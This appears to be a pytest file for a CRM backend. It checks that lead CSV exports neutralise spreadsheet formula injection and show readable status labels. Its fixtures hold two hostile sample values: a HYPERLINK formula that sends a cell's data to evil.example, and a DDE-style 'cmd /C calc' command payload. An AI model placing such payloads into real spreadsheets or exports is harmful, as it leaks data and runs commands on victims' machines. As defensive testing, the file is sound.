"""
The Leads CSV is text a spreadsheet shows, never formulas it runs.
=================================================================

Names, headlines and notes in the Leads CSV are written by other people. Any
LinkedIn member can put "=HYPERLINK(...)" in their name or "@SUM(...)" in their
headline, and the Leads screen's CSV link streamed them into the creator's
spreadsheet as live formulas. The support export already prefixed such cells;
this route did not. It also wrote the machine status (NEW, DM_SENT) where the
screen says New Lead or Outreach Sent.
"""

import csv
import io
import os
import sys
import tempfile

import pytest

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, os.path.join(REPO_ROOT, "studio", "backend"))

FORMULA_NAME = '=HYPERLINK("http://evil.example/?x="&A1,"Click")'
FORMULA_HEADLINE = "@SUM(1+1)*cmd|' /C calc'!A0"


@pytest.fixture
def client(monkeypatch):
    home = tempfile.mkdtemp(prefix="inox_csv_")
    monkeypatch.setenv("INOX_HYDRA_HOME", home)
    monkeypatch.delenv("INOX_DEMO_DATA", raising=False)
    from database import init_db
    from crm import reverse_crm
    from fastapi.testclient import TestClient
    import app as app_module

    init_db()
    lead_id = reverse_crm.ingest_interaction(
        full_name=FORMULA_NAME,
        linkedin_urn="https://www.linkedin.com/in/evil-one",
        headline=FORMULA_HEADLINE,
        interaction_type="COMMENT",
        comment_text="+1 to this",
    )["lead_id"]
    client = TestClient(app_module.app)
    assert client.put(f"/api/leads/{lead_id}/status",
                      json={"status": "Outreach Sent", "notes": "-call on Tuesday"}).status_code == 200
    return client


@pytest.mark.parametrize("route", ["/api/leads/export/csv", "/api/v1/crm/leads/export-csv"])
def test_a_cell_written_by_someone_else_cannot_run_as_a_formula(client, route):
    response = client.get(route)
    assert response.status_code == 200
    rows = list(csv.DictReader(io.StringIO(response.text)))
    row = next(r for r in rows if "HYPERLINK" in r["Name"])

    for column in ("Name", "Headline", "Notes"):
        assert row[column][:1] == "'", f"{column} reaches the spreadsheet as a formula: {row[column]!r}"
    assert row["Name"] == "'" + FORMULA_NAME, "the text itself must survive, only neutralised"
    assert row["Headline"] == "'" + FORMULA_HEADLINE


def test_the_status_column_says_what_the_screen_says(client):
    rows = list(csv.DictReader(io.StringIO(client.get("/api/leads/export/csv").text)))
    assert rows[0]["Status"] == "Outreach Sent", rows[0]["Status"]


def test_there_is_one_sanitiser_not_two():
    """The support export and the leads export share the helper rather than copies of it."""
    import leads
    import support

    assert leads.csv_cell is support._cell
